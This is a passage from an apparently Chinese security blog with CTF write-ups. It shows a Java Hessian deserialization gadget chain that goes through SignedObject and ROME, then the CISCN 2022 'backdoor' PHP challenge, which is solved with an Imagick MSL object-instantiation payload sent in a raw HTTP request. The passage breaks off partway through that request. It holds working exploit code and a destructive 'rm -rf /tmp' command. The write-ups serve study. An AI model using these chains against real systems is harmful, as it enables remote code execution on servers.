&#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(hashMap);</span><br><span class="line">        deserialize(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实是由于<code>TemplatesImpl</code>类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致<code>TemplatesImpl</code>类无法初始化<img src="../images/image-20230706175648609.png" alt="image-20230706175648609"></p><p><strong>但是如果在jdk的原生反序列化的话就可以序列化成功</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="../images/image-20230706175844926.png" alt="image-20230706175844926"></p><p>可以看到这里手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>，这样就解决了<code>_tfactory</code>无法被序列化的情况</p><p>当一个变量被声明为 transient 时，在进行对象的序列化过程中，该变量的值不会被持久化保存到字节流中。这意味着在对象被反序列化后，<strong>该变量的值将会被设置为其默认值，而不是序列化时的值。</strong></p><p>如果一个类中包含了 <code>readObject</code> 方法，在对象进行反序列化时，会按照以下顺序执行相关操作：</p><ol><li>默认的反序列化操作会读取对象的非 transient 字段，并将它们的值恢复。</li><li>如果类中有 <code>readObject</code> 方法，那么该方法会被调用。在这个方法中，你可以自定义读取和恢复对象状态的过程。你可以使用 <code>defaultReadObject</code> 方法读取默认字段值，也可以通过实现自定义逻辑来恢复其他字段的值。</li><li>反序列化过程完成后，返回反序列化后的对象。</li></ol><p><strong>所以说就是变量被声明为 transient的时候可以进行序列化操作，只不过是会再反序列化(<code>readobject</code>)的时候值仍然是默认值</strong> </p><p><strong>那么我们应该怎么办呢  想法就是想让其进行序列化成功，如何然后再使用<code>hessian</code>进行反序列化</strong></p><p>这里的话我们就可以想到二次反序列化了  这里使用的是<code>SignedObject</code>这个类</p><p><img src="../images/image-20230706180355930.png" alt="image-20230706180355930"></p><p><strong>这里面用的就是原生的jdk序列</strong></p><p>在SignedObject类的构造函数能够序列化一个类并且将其存储到属性<code>content</code>中</p><p>在其<code>getObject()</code>中能够将其反序列化出来，并且该方法还是getter</p><p><img src="../images/image-20230706200004122.png" alt="image-20230706200004122"></p><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法  是可以调用任意<code>getter</code>方法的</p><p><strong>这就完美符合我们的利用条件，于是可以构造出如下Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2023.1.2\\project\\Hessian\\src\\main\\java\\org\\example\\calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);</span><br><span class="line">        Hessian2_Deserial(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>个人理解</strong></p><p>在序列化的时候<img src="../images/image-20230706214832344.png" alt="image-20230706214832344"></p><p>这个回执行里面的方法来奖上面的<code>templatesimpl</code>给序列化掉</p><p>然后在反序列化的时候</p><p><img src="../images/image-20230706214927202.png" alt="image-20230706214927202"></p><p>这个方法会调用任意<code>getter</code>方法  然后就会调用到<code>SignedObject</code>里面的<code>getObject</code>方法</p><p><img src="../images/image-20230706215135347.png" alt="image-20230706215135347"></p><p>然后就会执行反序列化操作  最后执行恶意代码</p><p><img src="../images/image-20230706215244806.png" alt="image-20230706215244806"></p><h3 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h3><p>这里的话了解就行  因为搭建环境比较麻烦</p>]]></content>
      
      
      
        <tags>
            
            <tag> java-Hessian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn决赛-2022-backdoor</title>
      <link href="/posts/869a12bf.html"/>
      <url>/posts/869a12bf.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">题目wp</a></p><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">题目中关键的利用知识点</a></p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/tree/master">这里面有backdoor的docker容器</a></p><p>这里写这篇文章的目的是来加深对这道题的理解</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); // 没有<span class="title">echo</span></span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，存在两个魔法函数：</p><ul><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数。这里可以实现任意文件包含。</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数。这里可以执行一次无参函数结构。</li></ul><p>对于<code>__sleep__</code>来说，如果我们能够包含临时文件或者session即可rce。</p><p>目前的思路就有了，我们能够通过回调函数调用<code>session_start</code>，这里会触发序列化操作，如果我们能够控制session内容，那么就可以触发<code>__sleep</code>函数进行文件包含达成rce。接下来的目标则是想办法控制session内容。</p><p>(<strong>这个<code>session_start</code>是关键，在开启这个的时候会自动进行序列化，就是将session里的值进行序列化后存入存储介质中，然后因为访问了session中的数据，会自动将session中的值进行反序列化操作</strong>)</p><p><img src="../images/image-20230621160515951.png" alt="image-20230621160515951"></p><p>(<strong>是先进行—-反序列化—-在进行—-序列化—-操作</strong>)</p><p>对于<code>__wakeup__</code>来说，我们可以执行一次php内部类，那么我们可以利用此来探测信息</p><p>构造反序列化payload查看phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621162803997.png" alt="image-20230621162803997"></p><p>发现imagick拓展，想起之前看过的文章<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">exploiting-arbitrary-object-instantiations</a>，文章讲述了针对以下结构的php代码的一种攻击方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>再查看一下<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">               <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">           ) &#123;</span><br><span class="line">                   <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">               <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">               </span></span><br><span class="line"><span class="class">               <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); </span></span><br><span class="line"><span class="class">           &#125;</span></span><br><span class="line"><span class="class">   &#125;</span></span><br></pre></td></tr></table></figure><p>一方面题目给了同类型代码，另一方面题目限制了通过内置类的利用，显然我们需要利用<code>imagick</code>的特性进行攻击</p><p><code>imagick</code>类在初始化时可以执行<code>Magick Scripting Language</code>。那么考虑用其特性，在临时文件中写入<code>Magick Scripting Language</code>，然后在<code>imagick</code>类<strong>初始化的时候执行临时文件并且写入<code>session</code>文件</strong>。再触发<code>__sleep</code>包含<code>session</code>文件以<code>RCE</code>。</p><p>首先利用网站提供的功能，删除<code>/tmp</code>下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9999/?cmd=rm</span></span><br></pre></td></tr></table></figure><p>接下来发包写入session</p><p>构造反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="string">&quot;vid:msl:/tmp/php*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;imagick&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><strong>最后在反序列化的时候是会执行这样</strong>  <code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code></p><p>发包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>path%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>argv%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>vid%<span class="number">3</span>Amsl%<span class="number">3</span>A%<span class="number">2</span>Ftmp%<span class="number">2</span>Fphp*%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>imagick%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 703</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: 